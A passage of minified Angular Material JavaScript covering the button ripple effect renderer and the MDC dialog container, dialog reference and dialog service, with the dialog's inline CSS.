            : !!this._sanityChecks[n])
        );
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(ad), h(eO, 8), h(T));
      }),
      (e.ɵmod = $({ type: e })),
      (e.ɵinj = U({ imports: [en, en] })),
      e
    );
  })(),
  He = (function (t) {
    return (
      (t[(t.FADING_IN = 0)] = "FADING_IN"),
      (t[(t.VISIBLE = 1)] = "VISIBLE"),
      (t[(t.FADING_OUT = 2)] = "FADING_OUT"),
      (t[(t.HIDDEN = 3)] = "HIDDEN"),
      t
    );
  })(He || {}),
  hd = class {
    constructor(e, i, n, r = !1) {
      (this._renderer = e),
        (this.element = i),
        (this.config = n),
        (this._animationForciblyDisabledThroughCss = r),
        (this.state = He.HIDDEN);
    }
    fadeOut() {
      this._renderer.fadeOutRipple(this);
    }
  },
  Dv = _i({ passive: !0, capture: !0 }),
  pd = class {
    constructor() {
      (this._events = new Map()),
        (this._delegateEventHandler = (e) => {
          let i = nt(e);
          i &&
            this._events.get(e.type)?.forEach((n, r) => {
              (r === i || r.contains(i)) && n.forEach((o) => o.handleEvent(e));
            });
        });
    }
    addHandler(e, i, n, r) {
      let o = this._events.get(i);
      if (o) {
        let s = o.get(n);
        s ? s.add(r) : o.set(n, new Set([r]));
      } else
        this._events.set(i, new Map([[n, new Set([r])]])),
          e.runOutsideAngular(() => {
            document.addEventListener(i, this._delegateEventHandler, Dv);
          });
    }
    removeHandler(e, i, n) {
      let r = this._events.get(e);
      if (!r) return;
      let o = r.get(i);
      o &&
        (o.delete(n),
        0 === o.size && r.delete(i),
        0 === r.size &&
          (this._events.delete(e),
          document.removeEventListener(e, this._delegateEventHandler, Dv)));
    }
  },
  xv = { enterDuration: 225, exitDuration: 150 },
  tO = 800,
  Ev = _i({ passive: !0, capture: !0 }),
  Ov = ["mousedown", "touchstart"],
  Iv = ["mouseup", "mouseleave", "touchend", "touchcancel"],
  Gr = class Gr {
    constructor(e, i, n, r) {
      (this._target = e),
        (this._ngZone = i),
        (this._platform = r),
        (this._isPointerDown = !1),
        (this._activeRipples = new Map()),
        (this._pointerUpEventsRegistered = !1),
        r.isBrowser && (this._containerElement = St(n));
    }
    fadeInRipple(e, i, n = {}) {
      let r = (this._containerRect =
          this._containerRect ||
          this._containerElement.getBoundingClientRect()),
        o = C(C({}, xv), n.animation);
      n.centered && ((e = r.left + r.width / 2), (i = r.top + r.height / 2));
      let s = n.radius || nO(e, i, r),
        a = e - r.left,
        c = i - r.top,
        l = o.enterDuration,
        u = document.createElement("div");
      u.classList.add("mat-ripple-element"),
        (u.style.left = a - s + "px"),
        (u.style.top = c - s + "px"),
        (u.style.height = 2 * s + "px"),
        (u.style.width = 2 * s + "px"),
        null != n.color && (u.style.backgroundColor = n.color),
        (u.style.transitionDuration = `${l}ms`),
        this._containerElement.appendChild(u);
      let d = window.getComputedStyle(u),
        f = d.transitionProperty,
        m = d.transitionDuration,
        w =
          "none" === f ||
          "0s" === m ||
          "0s, 0s" === m ||
          (0 === r.width && 0 === r.height),
        M = new hd(this, u, n, w);
      (u.style.transform = "scale3d(1, 1, 1)"),
        (M.state = He.FADING_IN),
        n.persistent || (this._mostRecentTransientRipple = M);
      let G = null;
      return (
        !w &&
          (l || o.exitDuration) &&
          this._ngZone.runOutsideAngular(() => {
            let H = () => this._finishRippleTransition(M),
              me = () => this._destroyRipple(M);
            u.addEventListener("transitionend", H),
              u.addEventListener("transitioncancel", me),
              (G = { onTransitionEnd: H, onTransitionCancel: me });
          }),
        this._activeRipples.set(M, G),
        (w || !l) && this._finishRippleTransition(M),
        M
      );
    }
    fadeOutRipple(e) {
      if (e.state === He.FADING_OUT || e.state === He.HIDDEN) return;
      let i = e.element,
        n = C(C({}, xv), e.config.animation);
      (i.style.transitionDuration = `${n.exitDuration}ms`),
        (i.style.opacity = "0"),
        (e.state = He.FADING_OUT),
        (e._animationForciblyDisabledThroughCss || !n.exitDuration) &&
          this._finishRippleTransition(e);
    }
    fadeOutAll() {
      this._getActiveRipples().forEach((e) => e.fadeOut());
    }
    fadeOutAllNonPersistent() {
      this._getActiveRipples().forEach((e) => {
        e.config.persistent || e.fadeOut();
      });
    }
    setupTriggerEvents(e) {
      let i = St(e);
      !this._platform.isBrowser ||
        !i ||
        i === this._triggerElement ||
        (this._removeTriggerEvents(),
        (this._triggerElement = i),
        Ov.forEach((n) => {
          Gr._eventManager.addHandler(this._ngZone, n, i, this);
        }));
    }
    handleEvent(e) {
      "mousedown" === e.type
        ? this._onMousedown(e)
        : "touchstart" === e.type
        ? this._onTouchStart(e)
        : this._onPointerUp(),
        this._pointerUpEventsRegistered ||
          (this._ngZone.runOutsideAngular(() => {
            Iv.forEach((i) => {
              this._triggerElement.addEventListener(i, this, Ev);
            });
          }),
          (this._pointerUpEventsRegistered = !0));
    }
    _finishRippleTransition(e) {
      e.state === He.FADING_IN
        ? this._startFadeOutTransition(e)
        : e.state === He.FADING_OUT && this._destroyRipple(e);
    }
    _startFadeOutTransition(e) {
      let i = e === this._mostRecentTransientRipple,
        { persistent: n } = e.config;
      (e.state = He.VISIBLE), !n && (!i || !this._isPointerDown) && e.fadeOut();
    }
    _destroyRipple(e) {
      let i = this._activeRipples.get(e) ?? null;
      this._activeRipples.delete(e),
        this._activeRipples.size || (this._containerRect = null),
        e === this._mostRecentTransientRipple &&
          (this._mostRecentTransientRipple = null),
        (e.state = He.HIDDEN),
        null !== i &&
          (e.element.removeEventListener("transitionend", i.onTransitionEnd),
          e.element.removeEventListener(
            "transitioncancel",
            i.onTransitionCancel
          )),
        e.element.remove();
    }
    _onMousedown(e) {
      let i = od(e),
        n =
          this._lastTouchStartEvent &&
          Date.now() < this._lastTouchStartEvent + tO;
      !this._target.rippleDisabled &&
        !i &&
        !n &&
        ((this._isPointerDown = !0),
        this.fadeInRipple(e.clientX, e.clientY, this._target.rippleConfig));
    }
    _onTouchStart(e) {
      if (!this._target.rippleDisabled && !sd(e)) {
        (this._lastTouchStartEvent = Date.now()), (this._isPointerDown = !0);
        let i = e.changedTouches;
        if (i)
          for (let n = 0; n < i.length; n++)
            this.fadeInRipple(
              i[n].clientX,
              i[n].clientY,
              this._target.rippleConfig
            );
      }
    }
    _onPointerUp() {
      this._isPointerDown &&
        ((this._isPointerDown = !1),
        this._getActiveRipples().forEach((e) => {
          let i =
            e.state === He.VISIBLE ||
            (e.config.terminateOnPointerUp && e.state === He.FADING_IN);
          !e.config.persistent && i && e.fadeOut();
        }));
    }
    _getActiveRipples() {
      return Array.from(this._activeRipples.keys());
    }
    _removeTriggerEvents() {
      let e = this._triggerElement;
      e &&
        (Ov.forEach((i) => Gr._eventManager.removeHandler(i, e, this)),
        this._pointerUpEventsRegistered &&
          (Iv.forEach((i) => e.removeEventListener(i, this, Ev)),
          (this._pointerUpEventsRegistered = !1)));
    }
  };
Gr._eventManager = new pd();
var Pv = Gr;
function nO(t, e, i) {
  let n = Math.max(Math.abs(t - i.left), Math.abs(t - i.right)),
    r = Math.max(Math.abs(e - i.top), Math.abs(e - i.bottom));
  return Math.sqrt(n * n + r * r);
}
function iO(t, e) {}
var qr = class {
    constructor() {
      (this.role = "dialog"),
        (this.panelClass = ""),
        (this.hasBackdrop = !0),
        (this.backdropClass = ""),
        (this.disableClose = !1),
        (this.width = ""),
        (this.height = ""),
        (this.data = null),
        (this.ariaDescribedBy = null),
        (this.ariaLabelledBy = null),
        (this.ariaLabel = null),
        (this.ariaModal = !0),
        (this.autoFocus = "first-tabbable"),
        (this.restoreFocus = !0),
        (this.delayFocusTrap = !0),
        (this.closeOnNavigation = !0);
    }
  },
  md = "mdc-dialog--open",
  Sv = "mdc-dialog--opening",
  Tv = "mdc-dialog--closing",
  rO = 150,
  oO = 75,
  sO = (() => {
    let e = class e extends dd {
      constructor(n, r, o, s, a, c, l, u, d) {
        super(n, r, o, s, a, c, l, d),
          (this._animationMode = u),
          (this._animationStateChanged = new K()),
          (this._animationsEnabled = "NoopAnimations" !== this._animationMode),
          (this._actionSectionCount = 0),
          (this._hostElement = this._elementRef.nativeElement),
          (this._enterAnimationDuration = this._animationsEnabled
            ? Rv(this._config.enterAnimationDuration) ?? rO
            : 0),
          (this._exitAnimationDuration = this._animationsEnabled
            ? Rv(this._config.exitAnimationDuration) ?? oO
            : 0),
          (this._animationTimer = null),
          (this._finishDialogOpen = () => {
            this._clearAnimationClasses(),
              this._openAnimationDone(this._enterAnimationDuration);
          }),
          (this._finishDialogClose = () => {
            this._clearAnimationClasses(),
              this._animationStateChanged.emit({
                state: "closed",
                totalTime: this._exitAnimationDuration,
              });
          });
      }
      _contentAttached() {
        super._contentAttached(), this._startOpenAnimation();
      }
      _startOpenAnimation() {
        this._animationStateChanged.emit({
          state: "opening",
          totalTime: this._enterAnimationDuration,
        }),
          this._animationsEnabled
            ? (this._hostElement.style.setProperty(
                Av,
                `${this._enterAnimationDuration}ms`
              ),
              this._requestAnimationFrame(() =>
                this._hostElement.classList.add(Sv, md)
              ),
              this._waitForAnimationToComplete(
                this._enterAnimationDuration,
                this._finishDialogOpen
              ))
            : (this._hostElement.classList.add(md),
              Promise.resolve().then(() => this._finishDialogOpen()));
      }
      _startExitAnimation() {
        this._animationStateChanged.emit({
          state: "closing",
          totalTime: this._exitAnimationDuration,
        }),
          this._hostElement.classList.remove(md),
          this._animationsEnabled
            ? (this._hostElement.style.setProperty(
                Av,
                `${this._exitAnimationDuration}ms`
              ),
              this._requestAnimationFrame(() =>
                this._hostElement.classList.add(Tv)
              ),
              this._waitForAnimationToComplete(
                this._exitAnimationDuration,
                this._finishDialogClose
              ))
            : Promise.resolve().then(() => this._finishDialogClose());
      }
      _updateActionSectionCount(n) {
        (this._actionSectionCount += n), this._changeDetectorRef.markForCheck();
      }
      _clearAnimationClasses() {
        this._hostElement.classList.remove(Sv, Tv);
      }
      _waitForAnimationToComplete(n, r) {
        null !== this._animationTimer && clearTimeout(this._animationTimer),
          (this._animationTimer = setTimeout(r, n));
      }
      _requestAnimationFrame(n) {
        this._ngZone.runOutsideAngular(() => {
          "function" == typeof requestAnimationFrame
            ? requestAnimationFrame(n)
            : n();
        });
      }
      _captureInitialFocus() {
        this._config.delayFocusTrap || this._trapFocus();
      }
      _openAnimationDone(n) {
        this._config.delayFocusTrap && this._trapFocus(),
          this._animationStateChanged.next({ state: "opened", totalTime: n });
      }
      ngOnDestroy() {
        super.ngOnDestroy(),
          null !== this._animationTimer && clearTimeout(this._animationTimer);
      }
      attachComponentPortal(n) {
        let r = super.attachComponentPortal(n);
        return (
          r.location.nativeElement.classList.add(
            "mat-mdc-dialog-component-host"
          ),
          r
        );
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(
          P(te),
          P(_a),
          P(T, 8),
          P(qr),
          P(zr),
          P(O),
          P(Tt),
          P(oi, 8),
          P(ya)
        );
      }),
      (e.ɵcmp = he({
        type: e,
        selectors: [["mat-dialog-container"]],
        hostAttrs: [
          "tabindex",
          "-1",
          1,
          "mat-mdc-dialog-container",
          "mdc-dialog",
        ],
        hostVars: 10,
        hostBindings: function (r, o) {
          2 & r &&
            (Ps("id", o._config.id),
            xt("aria-modal", o._config.ariaModal)("role", o._config.role)(
              "aria-labelledby",
              o._config.ariaLabel ? null : o._ariaLabelledByQueue[0]
            )("aria-label", o._config.ariaLabel)(
              "aria-describedby",
              o._config.ariaDescribedBy || null
            ),
            Gt("_mat-animation-noopable", !o._animationsEnabled)(
              "mat-mdc-dialog-container-with-actions",
              o._actionSectionCount > 0
            ));
        },
        standalone: !0,
        features: [zt, qt],
        decls: 3,
        vars: 0,
        consts: [
          [1, "mdc-dialog__container"],
          [1, "mat-mdc-dialog-surface", "mdc-dialog__surface"],
          ["cdkPortalOutlet", ""],
        ],
        template: function (r, o) {
          1 & r &&
            (p(0, "div", 0)(1, "div", 1),
            et(2, iO, 0, 0, "ng-template", 2),
            g()());
        },
        dependencies: [$r],
        styles: [
          '.mdc-elevation-overlay{position:absolute;border-radius:inherit;pointer-events:none;opacity:var(--mdc-elevation-overlay-opacity, 0);transition:opacity 280ms cubic-bezier(0.4, 0, 0.2, 1)}.mdc-dialog,.mdc-dialog__scrim{position:fixed;top:0;left:0;align-items:center;justify-content:center;box-sizing:border-box;width:100%;height:100%}.mdc-dialog{display:none;z-index:var(--mdc-dialog-z-index, 7)}.mdc-dialog .mdc-dialog__content{padding:20px 24px 20px 24px}.mdc-dialog .mdc-dialog__surface{min-width:280px}@media(max-width: 592px){.mdc-dialog .mdc-dialog__surface{max-width:calc(100vw - 32px)}}@media(min-width: 592px){.mdc-dialog .mdc-dialog__surface{max-width:560px}}.mdc-dialog .mdc-dialog__surface{max-height:calc(100% - 32px)}.mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface{max-width:none}@media(max-width: 960px){.mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface{max-height:560px;width:560px}.mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface .mdc-dialog__close{right:-12px}}@media(max-width: 720px)and (max-width: 672px){.mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface{width:calc(100vw - 112px)}}@media(max-width: 720px)and (min-width: 672px){.mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface{width:560px}}@media(max-width: 720px)and (max-height: 720px){.mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface{max-height:calc(100vh - 160px)}}@media(max-width: 720px)and (min-height: 720px){.mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface{max-height:560px}}@media(max-width: 720px){.mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface .mdc-dialog__close{right:-12px}}@media(max-width: 720px)and (max-height: 400px),(max-width: 600px),(min-width: 720px)and (max-height: 400px){.mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface{height:100%;max-height:100vh;max-width:100vw;width:100vw;border-radius:0}.mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface .mdc-dialog__close{order:-1;left:-12px}.mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface .mdc-dialog__header{padding:0 16px 9px;justify-content:flex-start}.mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface .mdc-dialog__title{margin-left:calc(16px - 2 * 12px)}}@media(min-width: 960px){.mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface{width:calc(100vw - 400px)}.mdc-dialog.mdc-dialog--fullscreen .mdc-dialog__surface .mdc-dialog__close{right:-12px}}.mdc-dialog.mdc-dialog__scrim--hidden .mdc-dialog__scrim{opacity:0}.mdc-dialog__scrim{opacity:0;z-index:-1}.mdc-dialog__container{display:flex;flex-direction:row;align-items:center;justify-content:space-around;box-sizing:border-box;height:100%;opacity:0;pointer-events:none}.mdc-dialog__surface{position:relative;display:flex;flex-direction:column;flex-grow:0;flex-shrink:0;box-sizing:border-box;max-width:100%;max-height:100%;pointer-events:auto;overflow-y:auto;outline:0;transform:scale(0.8)}.mdc-dialog__surface .mdc-elevation-overlay{width:100%;height:100%;top:0;left:0}[dir=rtl] .mdc-dialog__surface,.mdc-dialog__surface[dir=rtl]{text-align:right}@media screen and (forced-colors: active),(-ms-high-contrast: active){.mdc-dialog__surface{outline:2px solid windowText}}.mdc-dialog__surface::before{position:absolute;box-sizing:border-box;width:100%;height:100%;top:0;left:0;border:2px solid rgba(0,0,0,0);border-radius:inherit;content:"";pointer-events:none}@media screen and (forced-colors: active){.mdc-dialog__surface::before{border-color:CanvasText}}@media screen and (-ms-high-contrast: active),screen and (-ms-high-contrast: none){.mdc-dialog__surface::before{content:none}}.mdc-dialog__title{display:block;margin-top:0;position:relative;flex-shrink:0;box-sizing:border-box;margin:0 0 1px;padding:0 24px 9px}.mdc-dialog__title::before{display:inline-block;width:0;height:40px;content:"";vertical-align:0}[dir=rtl] .mdc-dialog__title,.mdc-dialog__title[dir=rtl]{text-align:right}.mdc-dialog--scrollable .mdc-dialog__title{margin-bottom:1px;padding-bottom:15px}.mdc-dialog--fullscreen .mdc-dialog__header{align-items:baseline;border-bottom:1px solid rgba(0,0,0,0);display:inline-flex;justify-content:space-between;padding:0 24px 9px;z-index:1}@media screen and (forced-colors: active){.mdc-dialog--fullscreen .mdc-dialog__header{border-bottom-color:CanvasText}}.mdc-dialog--fullscreen .mdc-dialog__header .mdc-dialog__close{right:-12px}.mdc-dialog--fullscreen .mdc-dialog__title{margin-bottom:0;padding:0;border-bottom:0}.mdc-dialog--fullscreen.mdc-dialog--scrollable .mdc-dialog__title{border-bottom:0;margin-bottom:0}.mdc-dialog--fullscreen .mdc-dialog__close{top:5px}.mdc-dialog--fullscreen.mdc-dialog--scrollable .mdc-dialog__actions{border-top:1px solid rgba(0,0,0,0)}@media screen and (forced-colors: active){.mdc-dialog--fullscreen.mdc-dialog--scrollable .mdc-dialog__actions{border-top-color:CanvasText}}.mdc-dialog--fullscreen--titleless .mdc-dialog__close{margin-top:4px}.mdc-dialog--fullscreen--titleless.mdc-dialog--scrollable .mdc-dialog__close{margin-top:0}.mdc-dialog__content{flex-grow:1;box-sizing:border-box;margin:0;overflow:auto}.mdc-dialog__content>:first-child{margin-top:0}.mdc-dialog__content>:last-child{margin-bottom:0}.mdc-dialog__title+.mdc-dialog__content,.mdc-dialog__header+.mdc-dialog__content{padding-top:0}.mdc-dialog--scrollable .mdc-dialog__title+.mdc-dialog__content{padding-top:8px;padding-bottom:8px}.mdc-dialog__content .mdc-deprecated-list:first-child:last-child{padding:6px 0 0}.mdc-dialog--scrollable .mdc-dialog__content .mdc-deprecated-list:first-child:last-child{padding:0}.mdc-dialog__actions{display:flex;position:relative;flex-shrink:0;flex-wrap:wrap;align-items:center;justify-content:flex-end;box-sizing:border-box;min-height:52px;margin:0;padding:8px;border-top:1px solid rgba(0,0,0,0)}@media screen and (forced-colors: active){.mdc-dialog__actions{border-top-color:CanvasText}}.mdc-dialog--stacked .mdc-dialog__actions{flex-direction:column;align-items:flex-end}.mdc-dialog__button{margin-left:8px;margin-right:0;max-width:100%;text-align:right}[dir=rtl] .mdc-dialog__button,.mdc-dialog__button[dir=rtl]{margin-left:0;margin-right:8px}.mdc-dialog__button:first-child{margin-left:0;margin-right:0}[dir=rtl] .mdc-dialog__button:first-child,.mdc-dialog__button:first-child[dir=rtl]{margin-left:0;margin-right:0}[dir=rtl] .mdc-dialog__button,.mdc-dialog__button[dir=rtl]{text-align:left}.mdc-dialog--stacked .mdc-dialog__button:not(:first-child){margin-top:12px}.mdc-dialog--open,.mdc-dialog--opening,.mdc-dialog--closing{display:flex}.mdc-dialog--opening .mdc-dialog__scrim{transition:opacity 150ms linear}.mdc-dialog--opening .mdc-dialog__container{transition:opacity 75ms linear,transform 150ms 0ms cubic-bezier(0, 0, 0.2, 1)}.mdc-dialog--closing .mdc-dialog__scrim,.mdc-dialog--closing .mdc-dialog__container{transition:opacity 75ms linear}.mdc-dialog--closing .mdc-dialog__container{transform:none}.mdc-dialog--closing .mdc-dialog__surface{transform:none}.mdc-dialog--open .mdc-dialog__scrim{opacity:1}.mdc-dialog--open .mdc-dialog__container{opacity:1}.mdc-dialog--open .mdc-dialog__surface{transform:none}.mdc-dialog--open.mdc-dialog__surface-scrim--shown .mdc-dialog__surface-scrim{opacity:1}.mdc-dialog--open.mdc-dialog__surface-scrim--hiding .mdc-dialog__surface-scrim{transition:opacity 75ms linear}.mdc-dialog--open.mdc-dialog__surface-scrim--showing .mdc-dialog__surface-scrim{transition:opacity 150ms linear}.mdc-dialog__surface-scrim{display:none;opacity:0;position:absolute;width:100%;height:100%;z-index:1}.mdc-dialog__surface-scrim--shown .mdc-dialog__surface-scrim,.mdc-dialog__surface-scrim--showing .mdc-dialog__surface-scrim,.mdc-dialog__surface-scrim--hiding .mdc-dialog__surface-scrim{display:block}.mdc-dialog-scroll-lock{overflow:hidden}.mdc-dialog--no-content-padding .mdc-dialog__content{padding:0}.mdc-dialog--sheet .mdc-dialog__container .mdc-dialog__close{right:12px;top:9px;position:absolute;z-index:1}.mdc-dialog__scrim--removed{pointer-events:none}.mdc-dialog__scrim--removed .mdc-dialog__scrim,.mdc-dialog__scrim--removed .mdc-dialog__surface-scrim{display:none}.mat-mdc-dialog-content{max-height:65vh}.mat-mdc-dialog-container{position:static;display:block}.mat-mdc-dialog-container,.mat-mdc-dialog-container .mdc-dialog__container,.mat-mdc-dialog-container .mdc-dialog__surface{max-height:inherit;min-height:inherit;min-width:inherit;max-width:inherit}.mat-mdc-dialog-container .mdc-dialog__surface{width:100%;height:100%}.mat-mdc-dialog-component-host{display:contents}.mat-mdc-dialog-container{--mdc-dialog-container-elevation: var(--mdc-dialog-container-elevation-shadow);outline:0}.mat-mdc-dialog-container .mdc-dialog__surface{background-color:var(--mdc-dialog-container-color, white)}.mat-mdc-dialog-container .mdc-dialog__surface{box-shadow:var(--mdc-dialog-container-elevation, 0px 11px 15px -7px rgba(0, 0, 0, 0.2), 0px 24px 38px 3px rgba(0, 0, 0, 0.14), 0px 9px 46px 8px rgba(0, 0, 0, 0.12))}.mat-mdc-dialog-container .mdc-dialog__surface{border-radius:var(--mdc-dialog-container-shape, 4px)}.mat-mdc-dialog-container .mdc-dialog__title{font-family:var(--mdc-dialog-subhead-font, Roboto, sans-serif);line-height:var(--mdc-dialog-subhead-line-height, 1.5rem);font-size:var(--mdc-dialog-subhead-size, 1rem);font-weight:var(--mdc-dialog-subhead-weight, 400);letter-spacing:var(--mdc-dialog-subhead-tracking, 0.03125em)}.mat-mdc-dialog-container .mdc-dialog__title{color:var(--mdc-dialog-subhead-color, rgba(0, 0, 0, 0.87))}.mat-mdc-dialog-container .mdc-dialog__content{font-family:var(--mdc-dialog-supporting-text-font, Roboto, sans-serif);line-height:var(--mdc-dialog-supporting-text-line-height, 1.5rem);font-size:var(--mdc-dialog-supporting-text-size, 1rem);font-weight:var(--mdc-dialog-supporting-text-weight, 400);letter-spacing:var(--mdc-dialog-supporting-text-tracking, 0.03125em)}.mat-mdc-dialog-container .mdc-dialog__content{color:var(--mdc-dialog-supporting-text-color, rgba(0, 0, 0, 0.6))}.mat-mdc-dialog-container .mdc-dialog__container{transition:opacity linear var(--mat-dialog-transition-duration, 0ms)}.mat-mdc-dialog-container .mdc-dialog__surface{transition:transform var(--mat-dialog-transition-duration, 0ms) 0ms cubic-bezier(0, 0, 0.2, 1)}.mat-mdc-dialog-container._mat-animation-noopable .mdc-dialog__container,.mat-mdc-dialog-container._mat-animation-noopable .mdc-dialog__surface{transition:none}.cdk-overlay-pane.mat-mdc-dialog-panel{max-width:var(--mat-dialog-container-max-width, 80vw);min-width:var(--mat-dialog-container-min-width, 0)}@media(max-width: 599px){.cdk-overlay-pane.mat-mdc-dialog-panel{max-width:var(--mat-dialog-container-small-max-width, 80vw)}}.mat-mdc-dialog-title{padding:var(--mat-dialog-headline-padding, 0 24px 9px)}.mat-mdc-dialog-content{display:block}.mat-mdc-dialog-container .mat-mdc-dialog-content{padding:var(--mat-dialog-content-padding, 20px 24px)}.mat-mdc-dialog-container-with-actions .mat-mdc-dialog-content{padding:var(--mat-dialog-with-actions-content-padding, 20px 24px)}.mat-mdc-dialog-container .mat-mdc-dialog-title+.mat-mdc-dialog-content{padding-top:0}.mat-mdc-dialog-actions{padding:var(--mat-dialog-actions-padding, 8px);justify-content:var(--mat-dialog-actions-alignment, start)}.mat-mdc-dialog-actions.mat-mdc-dialog-actions-align-start,.mat-mdc-dialog-actions[align=start]{justify-content:start}.mat-mdc-dialog-actions.mat-mdc-dialog-actions-align-center,.mat-mdc-dialog-actions[align=center]{justify-content:center}.mat-mdc-dialog-actions.mat-mdc-dialog-actions-align-end,.mat-mdc-dialog-actions[align=end]{justify-content:flex-end}.mat-mdc-dialog-actions .mat-button-base+.mat-button-base,.mat-mdc-dialog-actions .mat-mdc-button-base+.mat-mdc-button-base{margin-left:8px}[dir=rtl] .mat-mdc-dialog-actions .mat-button-base+.mat-button-base,[dir=rtl] .mat-mdc-dialog-actions .mat-mdc-button-base+.mat-mdc-button-base{margin-left:0;margin-right:8px}',
        ],
        encapsulation: 2,
      })),
      e
    );
  })(),
  Av = "--mat-dialog-transition-duration";
function Rv(t) {
  return null == t
    ? null
    : "number" == typeof t
    ? t
    : t.endsWith("ms")
    ? Fr(t.substring(0, t.length - 2))
    : t.endsWith("s")
    ? 1e3 * Fr(t.substring(0, t.length - 1))
    : "0" === t
    ? 0
    : null;
}
var Ca = (function (t) {
    return (
      (t[(t.OPEN = 0)] = "OPEN"),
      (t[(t.CLOSING = 1)] = "CLOSING"),
      (t[(t.CLOSED = 2)] = "CLOSED"),
      t
    );
  })(Ca || {}),
  vd = class {
    constructor(e, i, n) {
      (this._ref = e),
        (this._containerInstance = n),
        (this._afterOpened = new N()),
        (this._beforeClosed = new N()),
        (this._state = Ca.OPEN),
        (this.disableClose = i.disableClose),
        (this.id = e.id),
        e.addPanelClass("mat-mdc-dialog-panel"),
        n._animationStateChanged
          .pipe(
            Q((r) => "opened" === r.state),
            ue(1)
          )
          .subscribe(() => {
            this._afterOpened.next(), this._afterOpened.complete();
          }),
        n._animationStateChanged
          .pipe(
            Q((r) => "closed" === r.state),
            ue(1)
          )
          .subscribe(() => {
            clearTimeout(this._closeFallbackTimeout), this._finishDialogClose();
          }),
        e.overlayRef.detachments().subscribe(() => {
          this._beforeClosed.next(this._result),
            this._beforeClosed.complete(),
            this._finishDialogClose();
        }),
        Ii(
          this.backdropClick(),
          this.keydownEvents().pipe(
            Q((r) => 27 === r.keyCode && !this.disableClose && !ha(r))
          )
        ).subscribe((r) => {
          this.disableClose ||
            (r.preventDefault(),
            aO(this, "keydown" === r.type ? "keyboard" : "mouse"));
        });
    }
    close(e) {
      (this._result = e),
        this._containerInstance._animationStateChanged
          .pipe(
            Q((i) => "closing" === i.state),
            ue(1)
          )
          .subscribe((i) => {
            this._beforeClosed.next(e),
              this._beforeClosed.complete(),
              this._ref.overlayRef.detachBackdrop(),
              (this._closeFallbackTimeout = setTimeout(
                () => this._finishDialogClose(),
                i.totalTime + 100
              ));
          }),
        (this._state = Ca.CLOSING),
        this._containerInstance._startExitAnimation();
    }
    afterOpened() {
      return this._afterOpened;
    }
    afterClosed() {
      return this._ref.closed;
    }
    beforeClosed() {
      return this._beforeClosed;
    }
    backdropClick() {
      return this._ref.backdropClick;
    }
    keydownEvents() {
      return this._ref.keydownEvents;
    }
    updatePosition(e) {
      let i = this._ref.config.positionStrategy;
      return (
        e && (e.left || e.right)
          ? e.left
            ? i.left(e.left)
            : i.right(e.right)
          : i.centerHorizontally(),
        e && (e.top || e.bottom)
          ? e.top
            ? i.top(e.top)
            : i.bottom(e.bottom)
          : i.centerVertically(),
        this._ref.updatePosition(),
        this
      );
    }
    updateSize(e = "", i = "") {
      return this._ref.updateSize(e, i), this;
    }
    addPanelClass(e) {
      return this._ref.addPanelClass(e), this;
    }
    removePanelClass(e) {
      return this._ref.removePanelClass(e), this;
    }
    getState() {
      return this._state;
    }
    _finishDialogClose() {
      (this._state = Ca.CLOSED),
        this._ref.close(this._result, {
          focusOrigin: this._closeInteractionType,
        }),
        (this.componentInstance = null);
    }
  };
function aO(t, e, i) {
  return (t._closeInteractionType = e), t.close(i);
}
var cO = new b("MatMdcDialogData"),
  lO = new b("mat-mdc-dialog-default-options"),
  uO = new b("mat-mdc-dialog-scroll-strategy", {
    providedIn: "root",
    factory: () => {
      let t = v(it);
      return () => t.scrollStrategies.block();
    },
  }),
  dO = 0,
  fO = (() => {
    let e = class e {
      get openDialogs() {
        return this._parentDialog
          ? this._parentDialog.openDialogs
          : this._openDialogsAtThisLevel;
      }
      get afterOpened() {
        return this._parentDialog
          ? this._parentDialog.afterOpened
          : this._afterOpenedAtThisLevel;
      }
      _getAfterAllClosed() {
        let n = this._parentDialog;
        return n ? n._getAfterAllClosed() : this._afterAllClosedAtThisLevel;
      }
      constructor(n, r, o, s, a, c, l, u) {
        (this._overlay = n),
          (this._defaultOptions = s),
          (this._scrollStrategy = a),
          (this._parentDialog = c),
          (this._openDialogsAtThisLevel = []),
          (this._afterAllClosedAtThisLevel = new N()),
          (this._afterOpenedAtThisLevel = new N()),
          (this.dialogConfigClass = qr),
          (this.afterAllClosed = Nt(() =>
            this.openDialogs.length
              ? this._getAfterAllClosed()
              : this._getAfterAllClosed().pipe(ot(void 0))
          )),
          (this._dialog = r.get(fd)),
          (this._dialogRefConstructor = vd),
          (this._dialogContainerType = sO),
          (this._dialogDataToken = cO);
      }
      open(n, r) {
        let o;
        ((r = C(C({}, this._defaultOptions || new qr()), r)).id =
          r.id || "mat-mdc-dialog-" + dO++),
          (r.scrollStrategy = r.scrollStrategy || this._scrollStrategy());
        let s = this._dialog.open(
          n,
          Z(C({}, r), {
            positionStrategy: this._overlay
              .position()
              .global()
              .centerHorizontally()
              .centerVertically(),
            disableClose: !0,
            closeOnDestroy: !1,
            closeOnOverlayDetachments: !1,
            container: {
              type: this._dialogContainerType,
              providers: () => [
                { provide: this.dialogConfigClass, useValue: r },
                { provide: En, useValue: r },
              ],
            },
            templateContext: () => ({ dialogRef: o }),
            providers: (a, c, l) => (
              (o = new this._dialogRefConstructor(a, r, l)),
              o.updatePosition(r?.position),
              [
                { provide: this._dialogContainerType, useValue: l },
                { provide: this._dialogDataToken, useValue: c.data },
                { provide: this._dialogRefConstructor, useValue: o },
              ]
            ),
          })
        );
        return (
          (o.componentRef = s.componentRef),
          (o.componentInstance = s.componentInstance),
          this.openDialogs.push(o),
          this.afterOpened.next(o),
          o.afterClosed().subscribe(() => {
            let a = this.openDialogs.indexOf(o);
            a > -1 &&
              (this.openDialogs.splice(a, 1),
              this.openDialogs.length || this._getAfterAllClosed().next());
          }),
          o
        );
      }
      closeAll() {
        this._closeDialogs(this.openDialogs);
      }
